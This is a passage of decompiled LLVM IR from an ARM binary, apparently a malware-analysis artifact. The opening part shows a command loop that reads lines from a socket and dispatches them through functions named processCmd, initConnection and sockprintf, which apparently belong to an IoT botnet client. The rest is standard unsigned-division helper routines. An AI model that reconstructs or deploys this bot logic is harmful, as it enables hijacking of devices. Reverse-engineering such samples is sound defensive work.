  store i32 ptrtoint (i32* @global_var_22c94.983 to i32), i32* @r1, align 4
  %v2_11770 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_22c94.983 to i32))
  %v2_11780 = icmp eq i32 %v2_11770, 0
  br i1 %v2_11780, label %dec_label_pc_11788, label %dec_label_pc_11690

dec_label_pc_11788:                               ; preds = %dec_label_pc_11768, %dec_label_pc_11664
  %stack_var_-40.1.lcssa = phi i32 [ 1, %dec_label_pc_11664 ], [ %stack_var_-40.0, %dec_label_pc_11768 ]
  %v3_11794 = call i32 @processCmd(i32 %stack_var_-40.1.lcssa, i32* nonnull %stack_var_-624)
  %v7_117a0 = icmp slt i32 %stack_var_-40.1.lcssa, 2
  br i1 %v7_117a0, label %dec_label_pc_117fc.outer, label %dec_label_pc_117b8.lr.ph

dec_label_pc_117b8.lr.ph:                         ; preds = %dec_label_pc_11788
  br label %dec_label_pc_117b8

dec_label_pc_117b8:                               ; preds = %dec_label_pc_117b8.lr.ph, %dec_label_pc_117b8
  %storemerge15127 = phi i32 [ 1, %dec_label_pc_117b8.lr.ph ], [ %v1_117e4, %dec_label_pc_117b8 ]
  %v3_117c4 = mul i32 %storemerge15127, 4
  %v2_117cc = add i32 %v3_117c4, %v19_10be4
  %v2_117d0 = add i32 %v2_117cc, -600
  %v1_117d4 = inttoptr i32 %v2_117d0 to i32*
  %v2_117d4 = load i32, i32* %v1_117d4, align 4
  store i32 %v2_117d4, i32* @r0, align 4
  %v0_117dc = call i32 @free()
  %v1_117e4 = add nuw nsw i32 %storemerge15127, 1
  %v5_117f8 = icmp slt i32 %v1_117e4, %stack_var_-40.1.lcssa
  br i1 %v5_117f8, label %dec_label_pc_117b8, label %dec_label_pc_117fc.outer

dec_label_pc_117fc.outer:                         ; preds = %dec_label_pc_117b8, %dec_label_pc_1137c, %dec_label_pc_1155c, %dec_label_pc_11788, %dec_label_pc_113d8, %dec_label_pc_10f8c
  %stack_var_-96.2.ph = phi i32 [ %stack_var_-96.0.ph19, %dec_label_pc_10f8c ], [ %stack_var_-96.1, %dec_label_pc_113d8 ], [ %stack_var_-96.1, %dec_label_pc_11788 ], [ %stack_var_-96.1, %dec_label_pc_1155c ], [ %stack_var_-96.1, %dec_label_pc_1137c ], [ %stack_var_-96.1, %dec_label_pc_117b8 ]
  br label %dec_label_pc_117fc

dec_label_pc_117fc:                               ; preds = %dec_label_pc_117fc.outer, %dec_label_pc_11308
  %v2_11800 = load i32, i32* @global_var_2c908.54, align 4
  %v5_1181c = call i32 @recvLine(i32 %v2_11800, i8* %v4_1181c, i32 4096, i32 %v2_1180c)
  %v3_1182c = icmp eq i32 %v5_1181c, -1
  br i1 %v3_1182c, label %dec_label_pc_10f70.outer, label %dec_label_pc_11238

; uselistorder directives
  uselistorder i32 %v5_1181c, { 1, 0 }
  uselistorder i32 %storemerge15127, { 1, 0 }
  uselistorder i32 %stack_var_-40.1.lcssa, { 2, 0, 1 }
  uselistorder i32 %v2_11770, { 1, 0 }
  uselistorder i8* %stack_var_-36.049, { 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-40.147, { 1, 3, 0, 2 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v1_11528, { 1, 0 }
  uselistorder i8* %storemerge743, { 1, 0 }
  uselistorder i32 %v1_114f0, { 1, 2, 0 }
  uselistorder i32 %v2_11468, { 1, 2, 0 }
  uselistorder i8* %v5_11420, { 5, 0, 3, 2, 1, 4, 6, 8, 7 }
  uselistorder i32 %v1_1141c, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8* %storemerge8, { 0, 1, 3, 4, 2 }
  uselistorder i32 %v1_11354, { 1, 2, 0 }
  uselistorder i1 %v9_1126c, { 1, 0 }
  uselistorder i32 %v3_11280, { 3, 2, 5, 0, 1, 4 }
  uselistorder i32 %v5_111b8, { 1, 0 }
  uselistorder i32 %v3_111ec, { 1, 2, 0, 3 }
  uselistorder i32 %v3_11160, { 1, 0 }
  uselistorder i32 %v1_11144, { 1, 0 }
  uselistorder i32 %v5_11088, { 1, 0 }
  uselistorder i32 %v1_11018, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_11574, { 2, 4, 3, 5, 1, 0 }
  uselistorder i8* %v4_1181c, { 3, 0, 1, 2 }
  uselistorder i32 %v2_1180c, { 6, 2, 3, 4, 5, 0, 1 }
  uselistorder i32 %v3_10e80, { 1, 0, 2 }
  uselistorder i32 %v2_10de4, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-88.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1648, { 1, 2, 0, 3 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_22c94.983 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32, i32, i32, i32)* @fdgets, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @szprintf, { 116, 115, 24, 23, 22, 21, 20, 114, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 113, 112, 111, 110, 109, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25 }
  uselistorder i32 ()* @listFork, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_2c910.72, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32* @global_var_32b90.75, { 0, 2, 3, 4, 5, 6, 7, 1, 8, 9 }
  uselistorder i32 (i32, i32)* @sockprintf, { 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 29, 0 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_32b84.316, { 0, 7, 1, 2, 3, 4, 5, 6 }
  uselistorder i32* @global_var_2c908.54, { 2, 3, 4, 5, 0, 1, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32 (i32)* @sleep, { 4, 3, 2, 1, 0 }
  uselistorder i32 30, { 0, 1, 2, 5, 3, 4 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 -600, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder [2 x i8]* @global_var_22c20.952, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_22c20.952 to i32), { 3, 1, 2, 0 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 1, 2, 3, 4, 22, 23, 20, 21 }
  uselistorder label %dec_label_pc_117fc.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_117b8, { 1, 0 }
  uselistorder label %dec_label_pc_11768, { 1, 0 }
  uselistorder label %dec_label_pc_11690, { 1, 0 }
  uselistorder label %dec_label_pc_11664, { 1, 0 }
  uselistorder label %dec_label_pc_1162c, { 1, 0 }
  uselistorder label %dec_label_pc_11504, { 1, 0 }
  uselistorder label %dec_label_pc_114e0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_114d0, { 1, 0 }
  uselistorder label %dec_label_pc_11450, { 1, 0 }
  uselistorder label %dec_label_pc_113b8, { 1, 0 }
  uselistorder label %dec_label_pc_1137c, { 1, 0 }
  uselistorder label %dec_label_pc_112a4, { 1, 0 }
  uselistorder label %dec_label_pc_1122c, { 1, 0 }
  uselistorder label %dec_label_pc_1119c, { 1, 0 }
  uselistorder label %dec_label_pc_1106c, { 1, 0 }
  uselistorder label %dec_label_pc_10f80, { 1, 0 }
  uselistorder label %dec_label_pc_10f70.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10f54, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10ec8, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_10da0, { 1, 0 }
  uselistorder label %dec_label_pc_10d2c, { 1, 0 }
}

define i32 @__udivsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1188c = add i32 %arg2, -1
  %v7_1188c = icmp eq i32 %arg2, 1
  br i1 %v7_1188c, label %bb, label %bb80

bb:                                               ; preds = %entry
  %v2_11890 = load i32, i32* @r0, align 4
  ret i32 %v2_11890

bb80:                                             ; preds = %entry
  %v2_1188c = icmp eq i32 %arg2, 0
  br i1 %v2_1188c, label %dec_label_pc_11974, label %dec_label_pc_11898

dec_label_pc_11898:                               ; preds = %bb80
  %v0_11898 = load i32, i32* @r0, align 4
  %tmp = icmp ugt i32 %v0_11898, %arg2
  br i1 %tmp, label %dec_label_pc_118a0, label %dec_label_pc_1192c

dec_label_pc_118a0:                               ; preds = %dec_label_pc_11898
  %v2_118a0 = and i32 %v1_1188c, %arg2
  %v4_118a0 = icmp eq i32 %v2_118a0, 0
  br i1 %v4_118a0, label %dec_label_pc_11938, label %dec_label_pc_118a8

dec_label_pc_118a8:                               ; preds = %dec_label_pc_118a0
  %v3_118a8 = icmp ult i32 %arg2, 536870912
  br i1 %v3_118a8, label %.thread, label %.preheader.preheader

.thread:                                          ; preds = %dec_label_pc_118a8
  %v4_118ac = mul i32 %arg2, 8
  br label %.preheader.preheader

.preheader.preheader:                             ; preds = %dec_label_pc_118a8, %.thread
  %v0_118cc.pr36.ph = phi i32 [ %v4_118ac, %.thread ], [ %arg2, %dec_label_pc_118a8 ]
  %storemerge135 = phi i32 [ 8, %.thread ], [ 1, %dec_label_pc_118a8 ]
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %bb83
  %v0_118cc.pr36 = phi i32 [ %v4_118c0, %bb83 ], [ %v0_118cc.pr36.ph, %.preheader.preheader ]
  %v1_118c4 = phi i32 [ %v4_118c4, %bb83 ], [ %storemerge135, %.preheader.preheader ]
  %v2_118b8 = icmp ugt i32 %v0_118cc.pr36, 268435455
  br i1 %v2_118b8, label %.thread2, label %bb81

.thread2:                                         ; preds = %.preheader
  br label %dec_label_pc_118ccthread-pre-split.loopexit

bb81:                                             ; preds = %.preheader
  %v4_118bc = icmp ult i32 %v0_118cc.pr36, %v0_11898
  br i1 %v4_118bc, label %bb82, label %dec_label_pc_118ccthread-pre-split.loopexit.loopexit

bb82:                                             ; preds = %bb81
  %v2_118c0 = and i32 %v0_118cc.pr36, 268435456
  %v3_118c0 = icmp eq i32 %v2_118c0, 0
  %v4_118c0 = mul i32 %v0_118cc.pr36, 16
  br i1 %v3_118c0, label %bb83, label %dec_label_pc_118cc.loopexit

bb83:                                             ; preds = %bb82
  %v2_118c4 = and i32 %v1_118c4, 268435456
  %v3_118c4 = icmp eq i32 %v2_118c4, 0
  %v4_118c4 = mul i32 %v1_118c4, 16
  br i1 %v3_118c4, label %.preheader, label %dec_label_pc_118ccthread-pre-split.loopexit.loopexit

dec_label_pc_118ccthread-pre-split.loopexit.loopexit: ; preds = %bb83, %bb81
  %v1_118d848.ph = phi i32 [ %v1_118c4, %bb81 ], [ %v4_118c4, %bb83 ]
  %v0_118cc.pr38.ph = phi i32 [ %v0_118cc.pr36, %bb81 ], [ %v4_118c0, %bb83 ]
  br label %dec_label_pc_118ccthread-pre-split.loopexit

dec_label_pc_118ccthread-pre-split.loopexit:      ; preds = %dec_label_pc_118ccthread-pre-split.loopexit.loopexit, %.thread2
  %v1_118d848 = phi i32 [ %v1_118c4, %.thread2 ], [ %v1_118d848.ph, %dec_label_pc_118ccthread-pre-split.loopexit.loopexit ]
  %v0_118cc.pr38 = phi i32 [ %v0_118cc.pr36, %.thread2 ], [ %v0_118cc.pr38.ph, %dec_label_pc_118ccthread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_118ccthread-pre-split

dec_label_pc_118ccthread-pre-split:               ; preds = %dec_label_pc_118ccthread-pre-split.loopexit, %bb85
  %v1_118d846 = phi i32 [ %v1_118d848, %dec_label_pc_118ccthread-pre-split.loopexit ], [ %v3_118d8, %bb85 ]
  %v0_118cc.pr = phi i32 [ %v0_118cc.pr38, %dec_label_pc_118ccthread-pre-split.loopexit ], [ %v3_118d4, %bb85 ]
  br label %dec_label_pc_118cc

dec_label_pc_118cc.loopexit:                      ; preds = %bb82
  br label %dec_label_pc_118cc

dec_label_pc_118cc:                               ; preds = %dec_label_pc_118cc.loopexit, %dec_label_pc_118ccthread-pre-split
  %v1_118d8 = phi i32 [ %v1_118d846, %dec_label_pc_118ccthread-pre-split ], [ %v1_118c4, %dec_label_pc_118cc.loopexit ]
  %v1_118d4 = phi i32 [ %v0_118cc.pr, %dec_label_pc_118ccthread-pre-split ], [ %v4_118c0, %dec_label_pc_118cc.loopexit ]
  %v2_118cc = icmp slt i32 %v1_118d4, 0
  br i1 %v2_118cc, label %dec_label_pc_118e0, label %bb84

bb84:                                             ; preds = %dec_label_pc_118cc
  %v4_118d0 = icmp ult i32 %v1_118d4, %v0_11898
  br i1 %v4_118d0, label %bb85, label %dec_label_pc_118e0

bb85:                                             ; preds = %bb84
  %v3_118d4 = mul i32 %v1_118d4, 2
  %v2_118d8 = icmp slt i32 %v1_118d8, 0
  %v3_118d8 = mul i32 %v1_118d8, 2
  br i1 %v2_118d8, label %dec_label_pc_118e0, label %dec_label_pc_118ccthread-pre-split

dec_label_pc_118e0:                               ; preds = %bb84, %dec_label_pc_118cc, %bb85
  %v2_118ec59 = phi i32 [ %v3_118d8, %bb85 ], [ %v1_118d8, %bb84 ], [ %v1_118d8, %dec_label_pc_118cc ]
  %v1_118e451 = phi i32 [ %v3_118d4, %bb85 ], [ %v1_118d4, %bb84 ], [ %v1_118d4, %dec_label_pc_118cc ]
  br label %dec_label_pc_118e4

dec_label_pc_118e4:                               ; preds = %.thread11, %dec_label_pc_118e0
  %v1_11918 = phi i32 [ %v4_11918, %.thread11 ], [ %v2_118ec59, %dec_label_pc_118e0 ]
  %v1_118ec = phi i32 [ %v0_11924, %.thread11 ], [ 0, %dec_label_pc_118e0 ]
  %v1_1191c = phi i32 [ %v4_1191c, %.thread11 ], [ %v1_118e451, %dec_label_pc_118e0 ]
  %v1_118e8 = phi i32 [ %v0_11914, %.thread11 ], [ %v0_11898, %dec_label_pc_118e0 ]
  %v3_118e4 = icmp ult i32 %v1_118e8, %v1_1191c
  br i1 %v3_118e4, label %.thread7, label %bb86

bb86:                                             ; preds = %dec_label_pc_118e4
  %v3_118e8 = sub i32 %v1_118e8, %v1_1191c
  %v3_118ec = or i32 %v1_118ec, %v1_11918
  br label %.thread7

.thread7:                                         ; preds = %dec_label_pc_118e4, %bb86
  %v1_118f4 = phi i32 [ %v1_118e8, %dec_label_pc_118e4 ], [ %v3_118e8, %bb86 ]
  %v1_118f8 = phi i32 [ %v1_118ec, %dec_label_pc_118e4 ], [ %v3_118ec, %bb86 ]
  %v4_118f0 = udiv i32 %v1_1191c, 2
  %v6_118f0 = icmp ult i32 %v1_118f4, %v4_118f0
  br i1 %v6_118f0, label %.thread8, label %bb87

bb87:                                             ; preds = %.thread7
  %v3_118f4 = urem i32 %v1_1191c, 2
  %v4_118f4 = icmp eq i32 %v3_118f4, 0
  %v6_118f4 = sub i32 %v1_118f4, %v4_118f0
  br i1 %v4_118f4, label %.thread8, label %bb88

bb88:                                             ; preds = %bb87
  %v5_118f8 = udiv i32 %v1_11918, 2
  %v6_118f8 = or i32 %v1_118f8, %v5_118f8
  br label %.thread8

.thread8:                                         ; preds = %bb87, %.thread7, %bb88
  %v1_11900 = phi i32 [ %v6_118f4, %bb87 ], [ %v1_118f4, %.thread7 ], [ %v6_118f4, %bb88 ]
  %v1_11904 = phi i32 [ %v1_118f8, %bb87 ], [ %v1_118f8, %.thread7 ], [ %v6_118f8, %bb88 ]
  %v4_118fc = udiv i32 %v1_1191c, 4
  %v6_118fc = icmp ult i32 %v1_11900, %v4_118fc
  br i1 %v6_118fc, label %.thread9, label %bb89

bb89:                                             ; preds = %.thread8
  %v3_11900 = and i32 %v1_1191c, 2
  %v4_11900 = icmp eq i32 %v3_11900, 0
  %v6_11900 = sub i32 %v1_11900, %v4_118fc
  br i1 %v4_11900, label %.thread9, label %bb90

bb90:                                             ; preds = %bb89
  %v5_11904 = udiv i32 %v1_11918, 4
  %v6_11904 = or i32 %v1_11904, %v5_11904
  br label %.thread9

.thread9:                                         ; preds = %bb89, %.thread8, %bb90
  %v1_1190c = phi i32 [ %v6_11900, %bb89 ], [ %v1_11900, %.thread8 ], [ %v6_11900, %bb90 ]
  %v1_11910 = phi i32 [ %v1_11904, %bb89 ], [ %v1_11904, %.thread8 ], [ %v6_11904, %bb90 ]
  %v4_11908 = udiv i32 %v1_1191c, 8
  %v6_11908 = icmp ult i32 %v1_1190c, %v4_11908
  br i1 %v6_11908, label %thread-pre-split, label %bb91

bb91:                                             ; preds = %.thread9
  %v3_1190c = and i32 %v1_1191c, 4
  %v4_1190c = icmp eq i32 %v3_1190c, 0
  %v6_1190c = sub i32 %v1_1190c, %v4_11908
  br i1 %v4_1190c, label %thread-pre-split, label %bb92

bb92:                                             ; preds = %bb91
  %v5_11910 = udiv i32 %v1_11918, 8
  %v6_11910 = or i32 %v1_11910, %v5_11910
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb92, %.thread9, %bb91
  %v0_11924 = phi i32 [ %v1_11910, %bb91 ], [ %v1_11910, %.thread9 ], [ %v6_11910, %bb92 ]
  %v0_11914 = phi i32 [ %v6_1190c, %bb91 ], [ %v1_1190c, %.thread9 ], [ %v6_1190c, %bb92 ]
  %v2_11914 = icmp eq i32 %v0_11914, 0
  br i1 %v2_11914, label %dec_label_pc_11924, label %bb93

bb93:                                             ; preds = %thread-pre-split
  %tmp140 = icmp ult i32 %v1_11918, 16
  br i1 %tmp140, label %dec_label_pc_11924, label %.thread11

.thread11:                                        ; preds = %bb93
  %v4_11918 = udiv i32 %v1_11918, 16
  %v4_1191c = udiv i32 %v1_1191c, 16
  br label %dec_label_pc_118e4

dec_label_pc_11924:                               ; preds = %thread-pre-split, %bb93
  ret i32 %v0_11924

dec_label_pc_1192c:                               ; preds = %dec_label_pc_11898
  %v9_11898 = icmp eq i32 %v0_11898, %arg2
  %. = zext i1 %v9_11898 to i32
  ret i32 %.

dec_label_pc_11938:                               ; preds = %dec_label_pc_118a0
  %v2_11938 = icmp ugt i32 %arg2, 65535
  br i1 %v2_11938, label %bb97, label %.thread16

bb97:                                             ; preds = %dec_label_pc_11938
  %v2_1193c = and i32 %arg2, 32768
  %v3_1193c = icmp eq i32 %v2_1193c, 0
  %v4_1193c = udiv i32 %arg2, 65536
  br i1 %v3_1193c, label %.thread16, label %bb98

.thread16:                                        ; preds = %bb97, %dec_label_pc_11938
  %v0_1194865 = phi i32 [ %arg2, %dec_label_pc_11938 ], [ %v4_1193c, %bb97 ]
  br label %bb98

bb98:                                             ; preds = %bb97, %.thread16
  %v1_1194c = phi i32 [ %v0_1194865, %.thread16 ], [ %v4_1193c, %bb97 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb97 ]
  %v2_11948 = icmp ugt i32 %v1_1194c, 255
  br i1 %v2_11948, label %bb99, label %.thread17

bb99:                                             ; preds = %bb98
  %v2_1194c = and i32 %v1_1194c, 128
  %v3_1194c = icmp eq i32 %v2_1194c, 0
  %v4_1194c = udiv i32 %v1_1194c, 256
  br i1 %v3_1194c, label %.thread17, label %bb100

bb100:                                            ; preds = %bb99
  %v2_11950 = or i32 %storemerge, 8
  br label %.thread17

.thread17:                                        ; preds = %bb99, %bb98, %bb100
  %v1_1195c = phi i32 [ %storemerge, %bb98 ], [ %storemerge, %bb99 ], [ %v2_11950, %bb100 ]
  %v1_11958 = phi i32 [ %v1_1194c, %bb98 ], [ %v4_1194c, %bb99 ], [ %v4_1194c, %bb100 ]
  %v2_11954 = icmp ugt i32 %v1_11958, 15
  br i1 %v2_11954, label %bb101, label %.thread18

bb101:                                            ; preds = %.thread17
  %v2_11958 = and i32 %v1_11958, 8
  %v3_11958 = icmp eq i32 %v2_11958, 0
  %v4_11958 = udiv i32 %v1_11958, 16
  br i1 %v3_11958, label %.thread18, label %bb102

bb102:                                            ; preds = %bb101
  %v2_1195c = add nsw i32 %v1_1195c, 4
  br label %.thread18

.thread18:                                        ; preds = %bb101, %.thread17, %bb102
  %v4_11964 = phi i32 [ %v1_1195c, %.thread17 ], [ %v1_1195c, %bb101 ], [ %v2_1195c, %bb102 ]
  %v5_11968 = phi i32 [ %v1_11958, %.thread17 ], [ %v4_11958, %bb101 ], [ %v4_11958, %bb102 ]
  %v2_11960 = icmp ugt i32 %v5_11968, 3
  %v7_11960 = icmp eq i32 %v5_11968, 4
  %v2_11964 = xor i1 %v7_11960, true
  %v3_11964 = and i1 %v2_11960, %v2_11964
  br i1 %v3_11964, label %bb103, label %bb104

bb103:                                            ; preds = %.thread18
  %v5_11964 = add nsw i32 %v4_11964, 3
  br label %bb104

bb104:                                            ; preds = %.thread18, %bb103
  %v4_11968 = phi i32 [ %v4_11964, %.thread18 ], [ %v5_11964, %bb103 ]
  %v2_11968 = xor i1 %v2_11960, true
  %v3_11968 = or i1 %v7_11960, %v2_11968
  br i1 %v3_11968, label %bb105, label %bb106

bb105:                                            ; preds = %bb104
  %v8_11968 = udiv i32 %v5_11968, 2
  %v9_11968 = add i32 %v4_11968, %v8_11968
  br label %bb106

bb106:                                            ; preds = %bb104, %bb105
  %v1_1196c = phi i32 [ %v4_11968, %bb104 ], [ %v9_11968, %bb105 ]
  %v6_1196c = lshr i32 %v0_11898, %v1_1196c
  ret i32 %v6_1196c

dec_label_pc_11974:                               ; preds = %bb80
  %v0_11974 = load i32, i32* @lr, align 4
  %v0_11978 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_11974)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_11968, { 1, 0 }
  uselistorder i1 %v7_11960, { 1, 0 }
  uselistorder i32 %v4_11958, { 1, 0 }
  uselistorder i32 %v1_11958, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1194c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1194c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1193c, { 1, 0 }
  uselistorder i32 %v0_11914, { 1, 0 }
  uselistorder i32 %v4_11908, { 1, 0 }
  uselistorder i32 %v1_11910, { 1, 2, 0 }
  uselistorder i32 %v4_118fc, { 1, 0 }
  uselistorder i32 %v1_11904, { 1, 2, 0 }
  uselistorder i32 %v4_118f0, { 1, 0 }
  uselistorder i32 %v1_118f8, { 1, 2, 0 }
  uselistorder i32 %v1_1191c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_118ec, { 1, 0 }
  uselistorder i32 %v1_11918, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_118d8, { 1, 0 }
  uselistorder i32 %v3_118d4, { 1, 0 }
  uselistorder i32 %v1_118d4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_118d8, { 1, 2, 0, 3 }
  uselistorder i32 %v4_118c4, { 1, 0 }
  uselistorder i32 %v4_118c0, { 2, 1, 0 }
  uselistorder i32 %v1_118c4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_118cc.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_11898, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_11924, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_118e0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_118ccthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_11988 = udiv i32 %arg1, %arg2
  ret i32 %v2_11988
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_1199c = add i32 %arg2, -1
  %v2_1199c = icmp eq i32 %arg2, 0
  br i1 %v2_1199c, label %dec_label_pc_11a58, label %dec_label_pc_119a4

dec_label_pc_119a4:                               ; preds = %entry
  %v7_1199c = icmp eq i32 %arg2, 1
  br i1 %v7_1199c, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_119a4
  %v1_119a4 = load i32, i32* @r0, align 4
  %v10_119a4 = icmp eq i32 %v1_119a4, %arg2
  br i1 %v10_119a4, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_119a4, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_119a4 = icmp ult i32 %v1_119a4, %arg2
  br i1 %v4_119a4, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_119ac = and i32 %v1_1199c, %arg2
  %v8_119ac = icmp eq i32 %v6_119ac, 0
  br i1 %v8_119ac, label %.thread67, label %dec_label_pc_119bc.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_119b0 = phi i32 [ %v1_119a4, %bb75 ], [ 0, %.thread65 ]
  %v3_119b0 = and i32 %v1_119b0, %v1_1199c
  br label %bb76

dec_label_pc_119bc.preheader:                     ; preds = %bb75
  %v2_119bc99 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_119bc99, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_11a4c, %bb74, %bb89, %bb84, %dec_label_pc_11a1c, %.thread67
  %v5_119b4 = phi i32 [ %v1_119a4, %bb74 ], [ %v3_119b0, %.thread67 ], [ %v1_119f8.v6_119f8.v6_11a00.v6_11a08, %dec_label_pc_11a1c ], [ 0, %bb84 ], [ %v1_11a50, %dec_label_pc_11a4c ], [ %v2_11a4c, %bb89 ]
  ret i32 %v5_119b4

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_119bc.preheader
  %v0_119d0.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_119bc.preheader ], [ %v4_119c4, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_119bc.preheader ], [ %v2_119c811, %.thread1.thread9 ]
  br label %dec_label_pc_119d0thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_119bc.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_119c811, %.thread1.thread9 ], [ 0, %dec_label_pc_119bc.preheader ]
  %v0_119d0.pr33100 = phi i32 [ %v4_119c4, %.thread1.thread9 ], [ %arg2, %dec_label_pc_119bc.preheader ]
  %v4_119c0 = icmp ult i32 %v0_119d0.pr33100, %v1_119a4
  br i1 %v4_119c0, label %bb78, label %dec_label_pc_119d0thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_119c4 = and i32 %v0_119d0.pr33100, 268435456
  %v3_119c4 = icmp eq i32 %v2_119c4, 0
  %v4_119c4 = mul i32 %v0_119d0.pr33100, 16
  br i1 %v3_119c4, label %.thread1.thread9, label %dec_label_pc_119d0.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_119c811 = add i32 %storemerge101, 4
  %v2_119bc = icmp ugt i32 %v4_119c4, 268435455
  br i1 %v2_119bc, label %.thread, label %bb77

dec_label_pc_119d0thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_119d0thread-pre-split.loopexit

dec_label_pc_119d0thread-pre-split.loopexit:      ; preds = %dec_label_pc_119d0thread-pre-split.loopexit.loopexit, %.thread
  %v0_119d0.pr3398 = phi i32 [ %v0_119d0.pr33.lcssa, %.thread ], [ %v0_119d0.pr33100, %dec_label_pc_119d0thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_119d0thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_119d0thread-pre-split

dec_label_pc_119d0thread-pre-split:               ; preds = %.thread4, %dec_label_pc_119d0thread-pre-split.loopexit
